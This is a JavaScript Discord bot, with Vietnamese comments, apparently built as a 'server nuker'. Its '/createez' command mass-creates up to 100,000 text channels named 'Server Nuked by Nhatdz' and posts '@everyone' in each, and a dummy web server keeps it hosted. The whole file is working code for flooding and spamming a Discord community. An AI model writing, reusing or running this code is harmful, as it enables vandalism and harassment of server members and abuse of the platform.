import express from "express";
import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  PermissionFlagsBits,
  ChannelType
} from "discord.js";
import "dotenv/config";

/* ===== Fake web server cho Render ===== */
const app = express();
app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000, () =>
  console.log("🌐 Web server running")
);
/* ===================================== */

const client = new Client({
  intents: [GatewayIntentBits.Guilds]
});

// ===== CONFIG =====
const MAX_TOTAL = 100000000;
const MAX_PER_RUN = 100000;
const CHANNEL_NAME = "Server Nuked by Nhatdz";
// ==================

const commands = [
  new SlashCommandBuilder()
    .setName("createez")
    .setDescription("Tạo tối đa 100000 kênh ez và ping everyone (tổng tối đa 100000000)")
    .setDefaultMemberPermissions(PermissionFlagsBits.Administrator)
].map(cmd => cmd.toJSON());

const rest = new REST({ version: "10" }).setToken(process.env.BOT_TOKEN);

(async () => {
  try {
    console.log("🔁 Đăng slash command...");
    await rest.put(
      Routes.applicationCommands(process.env.CLIENT_ID),
      { body: commands }
    );
    console.log("✅ Xong!");
  } catch (e) {
    console.error(e);
  }
})();

client.once("ready", () => {
  console.log(`🤖 Online: ${client.user.tag}`);
});

client.on("interactionCreate", async interaction => {
  if (!interaction.isChatInputCommand()) return;
  if (interaction.commandName !== "createez") return;

  if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
    return interaction.reply({ content: "❌ Bạn không có quyền admin.", ephemeral: true });
  }

  const guild = interaction.guild;

  const existing = guild.channels.cache.filter(
    c => c.type === ChannelType.GuildText && c.name === CHANNEL_NAME
  ).size;

  if (existing >= MAX_TOTAL) {
    return interaction.reply({
      content: `❌ Đã có ${existing}/${MAX_TOTAL} kênh "${CHANNEL_NAME}".`,
      ephemeral: true
    });
  }

  const canCreate = Math.min(MAX_PER_RUN, MAX_TOTAL - existing);

  await interaction.reply({
    content: `⚡ Đang tạo ${canCreate} kênh "${CHANNEL_NAME}"...`,
    ephemeral: true
  });

  const tasks = [];
  for (let i = 0; i < canCreate; i++) {
    tasks.push(
      guild.channels.create({
        name: CHANNEL_NAME,
        type: ChannelType.GuildText
      }).then(ch => ch.send("@everyone 🚀 Kênh mới!"))
    );
  }

  await Promise.all(tasks);

  await interaction.followUp({
    content: `✅ Đã tạo ${canCreate} kênh.`,
    ephemeral: true
  });
});

client.login(process.env.BOT_TOKEN);
